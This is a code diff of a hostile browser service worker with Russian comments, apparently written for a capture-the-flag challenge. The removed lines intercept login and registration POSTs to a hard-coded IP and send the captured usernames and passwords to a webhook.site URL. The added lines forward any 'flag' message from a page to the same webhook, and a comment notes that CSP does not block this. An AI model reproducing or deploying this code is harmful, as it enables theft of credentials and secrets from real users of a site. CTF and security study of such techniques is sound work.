@@ -1,39 +1,26 @@
+// 1. ЗАМЕНИТЕ ЭТОТ URL НА ВАШ УНИКАЛЬНЫЙ URL С WEBHOOK.SITE
 const WEBHOOK_URL = "https://webhook.site/48f9efa9-a38a-4c44-b214-5bdde77e8adf";
 
-const TARGET_HOST = "65.109.202.184"; 
+console.log('[SW] Service Worker starting up...');
 
-self.addEventListener('fetch', function(event) {
-    const requestUrl = new URL(event.request.url);
+// Обработчик для получения сообщений от страниц
+self.addEventListener('message', event => {
+    console.log(`[SW] Message received: ${event.data}`);
+    const flag = event.data;
 
-    if (requestUrl.host === TARGET_HOST && event.request.method === 'POST') {
-        if (requestUrl.pathname === '/register' || requestUrl.pathname === '/login') {
-            event.respondWith(async function() {
-                const requestClone = event.request.clone();
-                const formData = await requestClone.formData();
-                const username = formData.get('username');
-                const password = formData.get('password');
-
-                if (username) {
-                    console.log(`Intercepted username: ${username}, password: ${password}`);
-                    fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {
-                        mode: 'no-cors' 
-                    }).catch(e => console.error("Webhook fetch failed:", e));
-                }
-
-                return fetch(event.request);
-            }());
-            return;
-        }
-    }
-    event.respondWith(fetch(event.request));
+    // Отправляем флаг на вебхук. Мы в своем контексте, CSP нам не мешает.
+    fetch(`${WEBHOOK_URL}?flag=${encodeURIComponent(flag)}`, {
+        mode: 'no-cors'
+    });
 });
 
-self.addEventListener('install', function(event) {
-    console.log('Service Worker installed');
-    event.waitUntil(self.skipWaiting());
+// Эти обработчики нужны, чтобы SW активировался немедленно
+self.addEventListener('install', event => {
+    console.log('[SW] Installed.');
+    self.skipWaiting();
 });
 
-self.addEventListener('activate', function(event) {
-    console.log('Service Worker activated');
-    event.waitUntil(self.clients.claim());
+self.addEventListener('activate', event => {
+    console.log('[SW] Activated.');
+    event.waitUntil(clients.claim());
 });
